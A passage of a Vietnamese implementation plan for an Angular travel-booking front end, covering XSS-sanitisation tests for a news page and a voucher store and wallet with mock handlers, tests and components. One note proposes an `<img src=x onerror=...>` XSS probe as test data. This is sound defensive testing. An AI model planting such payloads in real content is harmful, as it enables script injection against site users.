      MockRegistry,
      provideHttpClient(withInterceptors([mockInterceptor])),
      {
        provide: ActivatedRoute,
        useValue: { snapshot: { paramMap: convertToParamMap({ id }) },
        },
      },
    ],
  }).compileComponents();
}

describe('ClientNewsDetail — chống XSS', () => {
  it('KHÔNG render thẻ script từ nội dung bài viết', async () => {
    await setup('1');
    const fixture = TestBed.createComponent(ClientNewsDetail);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 700));
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    expect(el.querySelector('script')).toBeNull();
  });

  it('render được nội dung hợp lệ', async () => {
    await setup('1');
    const fixture = TestBed.createComponent(ClientNewsDetail);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 700));
    fixture.detectChanges();

    const text = (fixture.nativeElement as HTMLElement).textContent ?? '';
    expect(text).toContain('Vietnam Airlines mở bán vé Tết 2027');
  });
});
```

**Lưu ý:** test này chứng minh thẻ `<script>` không xuất hiện trong DOM. Để chứng minh mạnh hơn, thêm một bài mock có `content` chứa `<img src=x onerror="...">` rồi khẳng định `el.querySelector('img[onerror]')` là null — nhưng dữ liệu mock hiện chưa có bài như vậy. Nếu muốn, thêm vào `NEWS_MOCK` một bản ghi id 99 với nội dung độc hại và test riêng.

- [ ] **Step 8: Thêm route**

Trong `src/app/app.routes.ts`, **thay** khối `news` (đang trỏ `coming-soon`) bằng:

```ts
      {
        path: 'news',
        loadComponent: () =>
          import('@features/client/pages/news/news-list').then((m) => m.ClientNewsList),
        data: { title: 'Tin tức' },
      },
      {
        path: 'news/:id',
        loadComponent: () =>
          import('@features/client/pages/news/news-detail').then((m) => m.ClientNewsDetail),
        data: { title: 'Chi tiết tin tức' },
      },
```

**Thứ tự:** `news` trước `news/:id`.

- [ ] **Step 9: Chạy test + build**

Run: `npx ng test --watch=false`
Expected: PASS.

Run: `npx ng build`
Expected: build xanh.

- [ ] **Step 10: Kiểm chứng trên trình duyệt**

- `/news`: chỉ bài `PUBLISHED` (bài `DRAFT` id 5 không hiện), 6 thẻ, có ảnh.
- Bấm một thẻ → `/news/1` hiện tiêu đề, ngày, danh mục, nội dung.
- 375px: một cột, không tràn ngang.

- [ ] **Step 11: Commit**

```bash
git add src/app/features/client/pages/news/ src/app/app.routes.ts
git commit -m "feat(news): trang tin tức cho khách với sanitize HTML chống XSS"
```

---

# CỤM 5 — Kho voucher & Voucher của tôi

Hai màn dùng chung endpoint `/voucher-store` và `/my-vouchers`. Nút **Nhận** là hành động nghiệp vụ có ràng buộc (hết lượt, đã nhận) nên phải hiện đúng trạng thái nút thay vì để khách bấm rồi báo lỗi.

### Task 5.1: Model + service + mock

**Files:**
- Create: `src/app/core/models/user-voucher.model.ts`
- Modify: `src/app/core/services/catalog.service.ts`
- Modify: `src/app/core/mock/data/catalog.mock.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Test: `src/app/core/mock/mock-registry.spec.ts`

**Interfaces:**
- Consumes: `Voucher` từ `@core/models/promotion.model`.
- Produces: `UserVoucher`, `VoucherStoreItem`; `UserVoucherService` với `store()`, `claim(id)`, `myVouchers()`; `USER_VOUCHERS_MOCK`.

- [ ] **Step 1: Viết model**

Tạo `src/app/core/models/user-voucher.model.ts`:

```ts
import { Voucher } from '@core/models/promotion.model';

/** Trạng thái một voucher trong ví khách — DB v0.4 bảng `user_vouchers`. */
export type UserVoucherStatus = 'AVAILABLE' | 'RESERVED' | 'USED' | 'EXPIRED';

/** Cách khách có voucher: tự nhận hoặc được ADMIN tặng. */
export type UserVoucherSource = 'CLAIMED' | 'GIFTED';

/**
 * Một voucher trong ví khách — API v0.2 mục 2.8 (`GET /my-vouchers`).
 *
 * `expires_at` là bản CHÉP của `vouchers.end_date` lúc nhận (DB v0.4 ghi rõ):
 * ADMIN sửa hạn voucher sau đó không làm đổi hạn của voucher đã phát. Vì vậy
 * màn "Voucher của tôi" phải hiện `expires_at`, KHÔNG phải `voucher.end_date`.
 */
export interface UserVoucher {
  id: number;
  status: UserVoucherStatus;
  source: UserVoucherSource;
  received_at: string;
  expires_at: string | null;
  used_at: string | null;
  discount_amount: number | null;
  voucher: Voucher;
}

/** Một voucher trong Kho — API v0.2 mục 2.8 (`GET /voucher-store`). */
export interface VoucherStoreItem extends Voucher {
  /** Khách đang đăng nhập đã nhận voucher này chưa. */
  claimed: boolean;
}
```

- [ ] **Step 2: Thêm service**

Thêm vào `src/app/core/services/catalog.service.ts`:

```ts
/**
 * Ví voucher của khách — API v0.2 mục 2.8.
 *
 * Không kế thừa `BaseCrudService`: ba endpoint này đều là góc nhìn của CHÍNH
 * khách (SELF), không phải CRUD theo id. Đặc biệt `claim` là hành động nghiệp
 * vụ có ràng buộc ở server (đếm lượt, UNIQUE theo khách).
 */
@Injectable({ providedIn: 'root' })
export class UserVoucherService {
  private readonly http = inject(HttpClient);
  private readonly baseUrl = `${environment.apiBaseUrl}`;

  /** Kho voucher: GLOBAL đang hiệu lực, còn lượt, khách chưa nhận. */
  store(query: { page?: number; size?: number } = {}): Observable<ApiResponse<PageData<VoucherStoreItem>>> {
    return this.http.get<ApiResponse<PageData<VoucherStoreItem>>>(`${this.baseUrl}/voucher-store`, {
      params: new HttpParams({ fromObject: query as Record<string, string> }),
    });
  }

  /** Nhận một voucher GLOBAL vào ví. */
  claim(voucherId: number): Observable<ApiResponse<{ user_voucher_id: number; status: UserVoucherStatus }>> {
    return this.http.post<ApiResponse<{ user_voucher_id: number; status: UserVoucherStatus }>>(
      `${this.baseUrl}/vouchers/${voucherId}/claim`,
      {},
    );
  }

  /** Ví của khách đang đăng nhập. */
  myVouchers(query: { page?: number; size?: number; status?: string } = {}): Observable<ApiResponse<PageData<UserVoucher>>> {
    return this.http.get<ApiResponse<PageData<UserVoucher>>>(`${this.baseUrl}/my-vouchers`, {
      params: new HttpParams({ fromObject: query as Record<string, string> }),
    });
  }
}
```

Thêm import `UserVoucher, VoucherStoreItem` từ `@core/models/user-voucher.model`, và `PageData` từ `@core/models/api-response.model`.

- [ ] **Step 3: Thêm mock data**

Thêm vào cuối `src/app/core/mock/data/catalog.mock.ts`:

```ts
/**
 * Ví voucher của khách — API v0.2 mục 2.8.
 *
 * Cố ý có đủ 4 trạng thái để thử giao diện: AVAILABLE (dùng được), RESERVED
 * (đang giữ cho booking chờ thanh toán), USED (đã dùng), EXPIRED (quá hạn).
 * Và đủ 2 nguồn: CLAIMED / GIFTED.
 */
export const USER_VOUCHERS_MOCK: UserVoucher[] = [
  {
    id: 1, status: 'AVAILABLE', source: 'CLAIMED',
    received_at: '2026-09-01T02:00:00Z', expires_at: '2027-12-31T17:00:00Z',
    used_at: null, discount_amount: null, voucher: VOUCHERS_MOCK[0],
  },
  {
    id: 2, status: 'RESERVED', source: 'CLAIMED',
    received_at: '2026-09-15T02:00:00Z', expires_at: '2027-10-31T17:00:00Z',
    used_at: null, discount_amount: null, voucher: VOUCHERS_MOCK[1],
  },
  {
    id: 3, status: 'USED', source: 'GIFTED',
    received_at: '2026-08-01T02:00:00Z', expires_at: '2026-12-31T17:00:00Z',
    used_at: '2026-08-20T09:30:00Z', discount_amount: 100000, voucher: VOUCHERS_MOCK[2],
  },
  {
    id: 4, status: 'EXPIRED', source: 'CLAIMED',
    received_at: '2026-01-05T02:00:00Z', expires_at: '2026-06-30T17:00:00Z',
    used_at: null, discount_amount: null, voucher: VOUCHERS_MOCK[3],
  },
];
```

Thêm import `UserVoucher` từ `@core/models/user-voucher.model`.

- [ ] **Step 4: Đăng ký mock handler**

Trong `mock-registry.ts`, thêm field:

```ts
  /** Ví voucher của khách đang đăng nhập (mock chỉ có một khách). */
  private userVouchers: UserVoucher[] = USER_VOUCHERS_MOCK.map((v) => ({ ...v }));
  private userVoucherIdSeq = 100;
```

Thêm nhánh trong `resolve()`:

```ts
    if (path === '/api/v1/voucher-store' && m === 'GET') {
      return this.voucherStore();
    }
    if (path === '/api/v1/my-vouchers' && m === 'GET') {
      return this.myVouchers(url);
    }
    const claimMatch = path.match(/^\/api\/v1\/vouchers\/(\d+)\/claim$/);
    if (claimMatch && m === 'POST') {
      return this.claimVoucher(Number(claimMatch[1]));
    }
```

Thêm method:

```ts
  /**
   * Kho voucher — GLOBAL, đang hiệu lực, còn lượt (API v0.2 mục 2.8).
   * Kèm cờ `claimed` để FE chọn hiện nút Nhận hay nhãn Đã nhận.
   */
  private voucherStore(): unknown {
    const today = new Date().toISOString().slice(0, 10);
    const claimedIds = new Set(this.userVouchers.map((uv) => uv.voucher.id));

    const items: VoucherStoreItem[] = VOUCHERS_MOCK.filter(
      (v) =>
        v.distribution_type === 'GLOBAL' &&
        v.is_active &&
        !v.is_deleted &&
        v.start_date <= today &&
        v.end_date >= today &&
        (v.claim_limit === null || v.claimed_count < v.claim_limit),
    ).map((v) => ({ ...v, claimed: claimedIds.has(v.id) }));

    return ok({ items, pagination: { page: 1, size: 20, total_items: items.length, total_pages: 1 } });
  }

  private myVouchers(url: string): unknown {
    const params = readParams(url);
    const status = params.get('status') ?? '';
    const rows = status
      ? this.userVouchers.filter((v) => v.status === status)
      : this.userVouchers;
    const page = Number(params.get('page') ?? 1);
    const size = Number(params.get('size') ?? 20);
    return ok(paginate(rows, page, size));
  }

  /**
   * Nhận voucher — mô phỏng đúng ràng buộc Backend (API v0.2 mục 2.8):
   * hết lượt → 1006; đã nhận rồi → 1005 (UNIQUE user_id + voucher_id).
   */
  private claimVoucher(voucherId: number): unknown {
    const voucher = VOUCHERS_MOCK.find((v) => v.id === voucherId && !v.is_deleted);
    if (!voucher) return notFound('Không tìm thấy voucher');

    if (this.userVouchers.some((uv) => uv.voucher.id === voucherId)) {
      return duplicate('Bạn đã nhận voucher này rồi');
    }
    if (voucher.claim_limit !== null && voucher.claimed_count >= voucher.claim_limit) {
      return businessError('Voucher đã hết lượt nhận');
    }

    voucher.claimed_count += 1;
    const created: UserVoucher = {
      id: this.userVoucherIdSeq++,
      status: 'AVAILABLE',
      source: 'CLAIMED',
      received_at: new Date().toISOString(),
      // Chép hạn của voucher lúc nhận (DB v0.4 ghi rõ lý do).
      expires_at: `${voucher.end_date}T17:00:00Z`,
      used_at: null,
      discount_amount: null,
      voucher,
    };
    this.userVouchers.push(created);
    return ok({ user_voucher_id: created.id, status: created.status }, 'Đã nhận voucher');
  }
```

Thêm import `USER_VOUCHERS_MOCK` và `UserVoucher, VoucherStoreItem`.

- [ ] **Step 5: Viết test**

Thêm vào `mock-registry.spec.ts`:

```ts
describe('Voucher store mock', () => {
  it('kho chỉ trả voucher GLOBAL đang hiệu lực và còn lượt', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('GET', 'http://x/api/v1/voucher-store') as ApiResponse<
      PageData<VoucherStoreItem>
    >;

    expect(res.data.items.every((v) => v.distribution_type === 'GLOBAL')).toBe(true);
    expect(res.data.items.every((v) => v.claimed_count < (v.claim_limit ?? Infinity))).toBe(true);
  });

  it('nhận voucher thành công thì ví tăng thêm một', () => {
    const registry = new MockRegistry();
    const before = (registry.resolve('GET', 'http://x/api/v1/my-vouchers') as ApiResponse<
      PageData<UserVoucher>
    >).data.pagination.total_items;

    const claim = registry.resolve('POST', 'http://x/api/v1/vouchers/4/claim') as ApiResponse<{
      status: string;
    }>;
    expect(claim.code).toBe(1000);
    expect(claim.data.status).toBe('AVAILABLE');

    const after = (registry.resolve('GET', 'http://x/api/v1/my-vouchers') as ApiResponse<
      PageData<UserVoucher>
    >).data.pagination.total_items;
    expect(after).toBe(before + 1);
  });

  it('nhận LẦN HAI cùng voucher trả 1005', () => {
    const registry = new MockRegistry();
    registry.resolve('POST', 'http://x/api/v1/vouchers/4/claim');
    const again = registry.resolve('POST', 'http://x/api/v1/vouchers/4/claim') as ApiResponse<null>;

    expect(again.code).toBe(1005);
  });

  it('sau khi nhận, kho đánh dấu claimed = true', () => {
    const registry = new MockRegistry();
    registry.resolve('POST', 'http://x/api/v1/vouchers/4/claim');

    const store = registry.resolve('GET', 'http://x/api/v1/voucher-store') as ApiResponse<
      PageData<VoucherStoreItem>
    >;
    expect(store.data.items.find((v) => v.id === 4)?.claimed).toBe(true);
  });

  it('ví có đủ 4 trạng thái trong dữ liệu mẫu', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('GET', 'http://x/api/v1/my-vouchers') as ApiResponse<
      PageData<UserVoucher>
    >;

    const statuses = new Set(res.data.items.map((v) => v.status));
    expect(statuses).toEqual(new Set(['AVAILABLE', 'RESERVED', 'USED', 'EXPIRED']));
  });
});
```

Thêm import `UserVoucher, VoucherStoreItem`.

- [ ] **Step 6: Chạy test — FAIL rồi PASS**

Run: `npx ng test --watch=false`

- [ ] **Step 7: Commit**

```bash
git add src/app/core/models/user-voucher.model.ts src/app/core/services/catalog.service.ts \
  src/app/core/mock/data/catalog.mock.ts src/app/core/mock/mock-registry.ts \
  src/app/core/mock/mock-registry.spec.ts
git commit -m "feat(voucher): model, service và mock cho kho voucher và ví khách"
```

### Task 5.2: Hai màn Kho voucher & Voucher của tôi

**Files:**
- Create: `src/app/features/client/pages/account/voucher-store.ts`
- Create: `src/app/features/client/pages/account/voucher-store.html`
- Create: `src/app/features/client/pages/account/voucher-store.css`
- Create: `src/app/features/client/pages/account/my-vouchers.ts`
- Create: `src/app/features/client/pages/account/my-vouchers.html`
- Create: `src/app/features/client/pages/account/my-vouchers.css`
- Modify: `src/app/app.routes.ts`

**Interfaces:**
- Consumes: `UserVoucherService`, `UserVoucher`, `VoucherStoreItem` từ Task 5.1.
- Produces: `VoucherStore`, `MyVouchers`; route `/account/voucher-store`, `/account/vouchers`.

- [ ] **Step 1: Viết màn Kho voucher — TS**

Tạo `voucher-store.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject, signal } from '@angular/core';
import { MatIconModule } from '@angular/material/icon';
import { MatSnackBar } from '@angular/material/snack-bar';
import { VoucherStoreItem } from '@core/models/user-voucher.model';
import { UserVoucherService } from '@core/services/catalog.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { AppButton } from '@shared/ui/app-button/app-button';
import { EmptyState } from '@shared/components/empty-state/empty-state';
import { SkeletonBlock } from '@shared/ui/skeleton-block/skeleton-block';

/**
 * Kho voucher — VOU-02 (API v0.2 mục 2.8).
 *
 * Vì sao hiện nút theo trạng thái chứ không luôn cho bấm: server từ chối nhận
 * trùng (1005) và hết lượt (1006). Để khách bấm rồi mới báo lỗi là trải nghiệm
 * tệ — nút phải nói trước được hay không.
 */
@Component({
  selector: 'app-voucher-store',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [MatIconModule, AppCard, AppButton, EmptyState, SkeletonBlock],
  templateUrl: './voucher-store.html',
  styleUrl: './voucher-store.css',
})
export class VoucherStore {
  private readonly service = inject(UserVoucherService);
  private readonly snackBar = inject(MatSnackBar);

  protected readonly loading = signal(true);
  protected readonly items = signal<VoucherStoreItem[]>([]);
  /** id voucher đang gửi yêu cầu nhận — để khoá nút, tránh bấm hai lần. */
  protected readonly claiming = signal<Set<number>>(new Set());

  private static readonly money = new Intl.NumberFormat('vi-VN');

  constructor() {
    this.load();
  }

  private load(): void {
    this.loading.set(true);
    this.service.store({ page: 1, size: 30 }).subscribe({
      next: (res) => {
        this.items.set(res.data.items);
        this.loading.set(false);
      },
      error: () => this.loading.set(false),
    });
  }

  /** Câu mô tả mức giảm, ví dụ "Giảm 50.000₫" hoặc "Giảm 10%, tối đa 200.000₫". */
  protected discountText(v: VoucherStoreItem): string {
    const value =
      v.discount_type === 'PERCENT'
        ? `Giảm ${v.discount_value}%`
        : `Giảm ${VoucherStore.money.format(v.discount_value)}₫`;
    if (v.discount_type === 'PERCENT' && v.max_discount_amount) {
      return `${value}, tối đa ${VoucherStore.money.format(v.max_discount_amount)}₫`;
    }
    return value;
  }

  protected minOrderText(v: VoucherStoreItem): string {
    return v.min_order_amount
      ? `Đơn từ ${VoucherStore.money.format(v.min_order_amount)}₫`
      : 'Không yêu cầu đơn tối thiểu';
  }

  protected formatDate(iso: string): string {
    return new Date(iso).toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }

  protected isClaiming(id: number): boolean {
    return this.claiming().has(id);
  }

  protected claim(item: VoucherStoreItem): void {
    if (item.claimed || this.isClaiming(item.id)) return;

    this.claiming.set(new Set(this.claiming()).add(item.id));
    this.service.claim(item.id).subscribe({
      next: (res) => {
        this.claiming.set(new Set([...this.claiming()].filter((x) => x !== item.id)));
        // Đánh dấu tại chỗ thay vì tải lại cả kho — nhanh hơn và không nhảy vị trí.
        this.items.set(this.items().map((v) => (v.id === item.id ? { ...v, claimed: true } : v)));
        this.snackBar.open(res.message, 'Đóng', { duration: 3000 });
      },
      error: (err: Error) => {
        this.claiming.set(new Set([...this.claiming()].filter((x) => x !== item.id)));
        this.snackBar.open(err.message, 'Đóng', { duration: 4000 });
      },
    });
  }
}
```

- [ ] **Step 2: Viết màn Kho voucher — HTML**

Tạo `voucher-store.html`:

```html
<div class="store">
  <header class="store__h">
    <h1>Kho voucher</h1>
    <p>Nhận voucher vào ví rồi chọn khi thanh toán — không cần nhập mã</p>
  </header>

  @if (loading()) {
    <div class="v-grid">
      @for (i of [1, 2, 3]; track i) {
        <div class="v v--skeleton">
          <app-skeleton-block height="86px" />
          <div class="v__bd">
            <app-skeleton-block width="70%" height="15px" />
            <div style="height: 8px"></div>
            <app-skeleton-block width="90%" height="12px" />
          </div>
        </div>
      }
    </div>
  } @else if (items().length === 0) {
    <app-app-card>
      <app-empty-state
        icon="redeem"
        message="Kho voucher đang trống"
        hint="Ưu đãi mới sẽ xuất hiện ở đây"
      />
    </app-app-card>
  } @else {
    <div class="v-grid">
      @for (v of items(); track v.id) {
        <article class="v" [class.v--claimed]="v.claimed">
          <div class="v__top">
            <div class="v__val">{{ discountText(v) }}</div>
            @if (v.claimed) {
              <span class="v__flag"><mat-icon>check_circle</mat-icon> Đã nhận</span>
            }
          </div>

          <div class="v__bd">
            <h3 class="v__nm">{{ v.voucher_name }}</h3>
            @if (v.description) {
              <p class="v__ds">{{ v.description }}</p>
            }
            <ul class="v__meta">
              <li>{{ minOrderText(v) }}</li>
              <li>HSD: {{ formatDate(v.end_date) }}</li>
              @if (v.claim_limit !== null) {
                <li>Còn {{ v.claim_limit - v.claimed_count }} lượt</li>
              }
            </ul>
          </div>

          <div class="v__act">
            @if (v.claimed) {
              <app-app-button variant="ghost" [disabled]="true">Đã nhận</app-app-button>
            } @else {
              <app-app-button [disabled]="isClaiming(v.id)" (clicked)="claim(v)">
                {{ isClaiming(v.id) ? 'Đang nhận…' : 'Nhận voucher' }}
              </app-app-button>
            }
          </div>
        </article>
      }
    </div>
  }
</div>
```

- [ ] **Step 3: Viết màn Kho voucher — CSS**

Tạo `voucher-store.css`:

```css
.store__h {
  margin-bottom: 18px;
}

.store__h h1 {
  font-family: var(--font-heading);
  font-size: 22px;
  font-weight: 700;
  margin: 0 0 4px;
}

.store__h p {
  margin: 0;
  font-size: 13px;
  color: var(--color-ink-muted);
}

.v-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
  gap: 14px;
}

.v {
  display: flex;
  flex-direction: column;
  border-radius: var(--radius-lg);
  overflow: hidden;
  background: var(--color-surface);
  border: 1px solid var(--color-border);
}

/* Voucher đã nhận: làm mờ để mắt bỏ qua, nhưng vẫn đọc được. */
.v--claimed {
  opacity: 0.62;
}

.v__top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  padding: 14px 16px;
  background: linear-gradient(135deg, var(--color-primary), var(--color-primary-bright));
  color: #fff;
}

.v__val {
  font-family: var(--font-heading);
  font-size: 18px;
  font-weight: 700;
}

.v__flag {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 11.5px;
  font-weight: 700;
  padding: 3px 9px;
  border-radius: 999px;
  background: rgba(255, 255, 255, 0.22);
}

.v__flag mat-icon {
  font-size: 14px;
  width: 14px;
  height: 14px;
}

.v__bd {
  flex: 1 1 auto;
  padding: 14px 16px;
}

.v__nm {
  font-family: var(--font-heading);
  font-size: 15px;
  font-weight: 700;
  margin: 0 0 6px;
}

.v__ds {
  font-size: 12.5px;
  color: var(--color-ink-muted);
  line-height: 1.55;
  margin: 0 0 10px;
}

.v__meta {
  list-style: none;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  gap: 3px;
  font-size: 11.5px;
  color: var(--color-ink-subtle);
}

.v__act {
  padding: 0 16px 15px;
}

.v__act app-app-button {
  display: block;
}

.v--skeleton {
  pointer-events: none;
}
```

- [ ] **Step 4: Viết màn Voucher của tôi — TS**

Tạo `my-vouchers.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { UserVoucher, UserVoucherStatus } from '@core/models/user-voucher.model';
import { UserVoucherService } from '@core/services/catalog.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { EmptyState } from '@shared/components/empty-state/empty-state';
import { SkeletonBlock } from '@shared/ui/skeleton-block/skeleton-block';

/** Nhãn + màu cho từng trạng thái ví — một chỗ duy nhất để không lệch giữa các màn. */
const STATUS_META: Record<UserVoucherStatus, { label: string; tone: string }> = {
  AVAILABLE: { label: 'Dùng được', tone: 'success' },
  RESERVED: { label: 'Đang giữ', tone: 'info' },
  USED: { label: 'Đã dùng', tone: 'neutral' },
  EXPIRED: { label: 'Hết hạn', tone: 'danger' },
};

/**
 * Voucher của tôi — VOU-01/VOU-05 (API v0.2 mục 2.8).
 *
 * Hiện `expires_at` của DÒNG VÍ, không phải `voucher.end_date`: hạn được chép
 * lúc nhận, ADMIN sửa hạn voucher sau đó không ảnh hưởng voucher đã phát
 * (DB v0.4 ghi rõ). Hiện nhầm trường là nói sai hạn cho khách.
 */
@Component({
  selector: 'app-my-vouchers',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [RouterLink, MatIconModule, AppCard, EmptyState, SkeletonBlock],
  templateUrl: './my-vouchers.html',
  styleUrl: './my-vouchers.css',
})
export class MyVouchers {
  private readonly service = inject(UserVoucherService);

  protected readonly loading = signal(true);
  protected readonly vouchers = signal<UserVoucher[]>([]);
  protected readonly filter = signal<UserVoucherStatus | ''>('');

  private static readonly money = new Intl.NumberFormat('vi-VN');

  protected readonly filtered = computed(() => {
    const f = this.filter();
    return f ? this.vouchers().filter((v) => v.status === f) : this.vouchers();
  });

  protected readonly counts = computed(() => {
    const all = this.vouchers();
    return {
      AVAILABLE: all.filter((v) => v.status === 'AVAILABLE').length,
      USED: all.filter((v) => v.status === 'USED').length,
      EXPIRED: all.filter((v) => v.status === 'EXPIRED').length,
    };
  });

  constructor() {
    this.service.myVouchers({ page: 1, size: 50 }).subscribe({
      next: (res) => {
        this.vouchers.set(res.data.items);
        this.loading.set(false);
      },
      error: () => this.loading.set(false),
    });
  }

  protected statusLabel(s: UserVoucherStatus): string {
    return STATUS_META[s].label;
  }

  protected statusTone(s: UserVoucherStatus): string {
    return STATUS_META[s].tone;
  }

  protected setFilter(value: UserVoucherStatus | ''): void {
    this.filter.set(value);
  }

  /** Voucher đã dùng/hết hạn thì làm mờ — không còn hành động nào. */
  protected isDimmed(v: UserVoucher): boolean {
    return v.status === 'USED' || v.status === 'EXPIRED';
  }

  protected discountText(v: UserVoucher): string {
    const value =
      v.voucher.discount_type === 'PERCENT'
        ? `${v.voucher.discount_value}%`
        : `${MyVouchers.money.format(v.voucher.discount_value)}₫`;
    return v.voucher.discount_type === 'PERCENT' ? `Giảm ${value}` : `Giảm ${value}`;
  }

  protected formatDate(iso: string | null): string {
    return iso ? new Date(iso).toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' }) : '—';
  }
}
```

- [ ] **Step 5: Viết màn Voucher của tôi — HTML**

Tạo `my-vouchers.html`:

```html
<div class="mv">
  <header class="mv__h">
    <h1>Voucher của tôi</h1>
    <p>Voucher đã nhận — chọn từ ví khi thanh toán, không cần nhập mã</p>
  </header>

  <div class="mv__stats">
    <span class="stat"><b>{{ counts().AVAILABLE }}</b> dùng được</span>
    <span class="stat"><b>{{ counts().USED }}</b> đã dùng</span>
    <span class="stat"><b>{{ counts().EXPIRED }}</b> hết hạn</span>
  </div>

  <div class="mv__filters">
    <button type="button" class="chip" [class.chip--on]="filter() === ''" (click)="setFilter('')">
      Tất cả
    </button>
    <button type="button" class="chip" [class.chip--on]="filter() === 'AVAILABLE'" (click)="setFilter('AVAILABLE')">
      Dùng được
    </button>
    <button type="button" class="chip" [class.chip--on]="filter() === 'RESERVED'" (click)="setFilter('RESERVED')">
      Đang giữ
    </button>
    <button type="button" class="chip" [class.chip--on]="filter() === 'USED'" (click)="setFilter('USED')">
      Đã dùng
    </button>
    <button type="button" class="chip" [class.chip--on]="filter() === 'EXPIRED'" (click)="setFilter('EXPIRED')">
      Hết hạn
    </button>
  </div>

  @if (loading()) {
    <div class="mv__grid">
      @for (i of [1, 2]; track i) {
        <div class="card card--skeleton">
          <app-skeleton-block height="80px" />
          <div class="card__bd">
            <app-skeleton-block width="70%" height="15px" />
          </div>
        </div>
      }
    </div>
  } @else if (filtered().length === 0) {
    <app-app-card>
      <app-empty-state
        icon="card_membership"
        message="Không có voucher nào"
        hint="Vào Kho voucher để nhận ưu đãi"
        actionLabel="Đến kho voucher"
      />
      <a class="to-store" routerLink="/account/voucher-store">Đến kho voucher</a>
    </app-app-card>
  } @else {
    <div class="mv__grid">
      @for (v of filtered(); track v.id) {
        <article class="card" [class.card--dim]="isDimmed(v)">
          <div class="card__top">
            <span class="card__val">{{ discountText(v) }}</span>
            <span class="card__st" [class]="'card__st--' + statusTone(v.status)">
              {{ statusLabel(v.status) }}
            </span>
          </div>

          <div class="card__bd">
            <h3 class="card__nm">{{ v.voucher.voucher_name }}</h3>
            @if (v.voucher.description) {
              <p class="card__ds">{{ v.voucher.description }}</p>
            }
            <ul class="card__meta">
              <li>
                <mat-icon>event</mat-icon>
                HSD: {{ formatDate(v.expires_at) }}
              </li>
              <li>
                <mat-icon>card_giftcard</mat-icon>
                {{ v.source === 'CLAIMED' ? 'Tự nhận từ kho' : 'Được tặng' }}
              </li>
              @if (v.used_at) {
                <li>
                  <mat-icon>check</mat-icon>
                  Dùng lúc {{ formatDate(v.used_at) }}
                  @if (v.discount_amount) {
                    — giảm {{ v.discount_amount }}₫
                  }
                </li>
              }
            </ul>
          </div>
        </article>
      }
    </div>
  }
</div>
```

- [ ] **Step 6: Viết màn Voucher của tôi — CSS**

Tạo `my-vouchers.css`:

```css
.mv__h {
  margin-bottom: 14px;
}

.mv__h h1 {
  font-family: var(--font-heading);
  font-size: 22px;
  font-weight: 700;
  margin: 0 0 4px;
}

.mv__h p {
  margin: 0;
  font-size: 13px;
  color: var(--color-ink-muted);
}

.mv__stats {
  display: flex;
  gap: 16px;
  flex-wrap: wrap;
  margin-bottom: 14px;
  font-size: 13px;
  color: var(--color-ink-muted);
}

.stat b {
  font-family: var(--font-heading);
  font-size: 17px;
  color: var(--color-ink);
  margin-right: 3px;
}

.mv__filters {
  display: flex;
  gap: 7px;
  flex-wrap: wrap;
  margin-bottom: 16px;
}

.chip {
  font-family: var(--font-body);
  font-size: 12.5px;
  font-weight: 600;
  padding: 6px 13px;
  border-radius: 999px;
  border: 1.5px solid var(--color-border);
  background: var(--color-surface);
  color: var(--color-ink-muted);
  cursor: pointer;
}

.chip:hover {
  border-color: var(--color-primary-bright);
  color: var(--color-primary);
}

.chip--on {
  background: var(--color-primary-bright);
  border-color: var(--color-primary-bright);
  color: #fff;
}

.mv__grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
  gap: 14px;
}

.card {
  border-radius: var(--radius-lg);
  overflow: hidden;
  background: var(--color-surface);
  border: 1px solid var(--color-border);
}

/* Voucher đã dùng / hết hạn: làm mờ vì không còn hành động nào. */
.card--dim {
  opacity: 0.6;
}

.card__top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  padding: 13px 16px;
  background: var(--color-surface-alt);
  border-bottom: 1px solid var(--color-border-soft);
}

.card__val {
  font-family: var(--font-heading);
  font-size: 17px;
  font-weight: 700;
  color: var(--color-primary);
}

.card__st {
  font-size: 11.5px;
  font-weight: 700;
  padding: 3px 10px;
  border-radius: 999px;
}

.card__st--success {
  background: var(--color-success-soft);
  color: var(--color-on-success-soft);
}

.card__st--info {
  background: var(--color-info-soft);
  color: var(--color-on-info-soft);
}

.card__st--neutral {
  background: var(--color-border-soft);
  color: var(--color-ink-muted);
}

.card__st--danger {
  background: var(--color-danger-soft);
  color: var(--color-on-danger-soft);
}

.card__bd {
  padding: 14px 16px;
}

.card__nm {
  font-family: var(--font-heading);
  font-size: 15px;
  font-weight: 700;
  margin: 0 0 6px;
}

.card__ds {
  font-size: 12.5px;
  color: var(--color-ink-muted);
  line-height: 1.55;
  margin: 0 0 10px;
}

.card__meta {
  list-style: none;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  gap: 5px;
  font-size: 11.5px;
  color: var(--color-ink-subtle);
}

.card__meta li {
  display: flex;
  align-items: center;
  gap: 5px;
}

.card__meta mat-icon {
  font-size: 14px;
  width: 14px;
  height: 14px;
}

.to-store {
  display: inline-block;
  margin-top: 12px;
  font-size: 13px;
  font-weight: 600;
  color: var(--color-primary-bright);
}

.card--skeleton {
  pointer-events: none;
}
```

- [ ] **Step 7: Thêm route**

Trong `src/app/app.routes.ts`, trong khối `children` của `account`, **xóa** hai dòng `...comingSoonAccount('vouchers', 'Voucher của tôi'),` và thêm:

```ts
          {
            path: 'vouchers',
            loadComponent: () =>
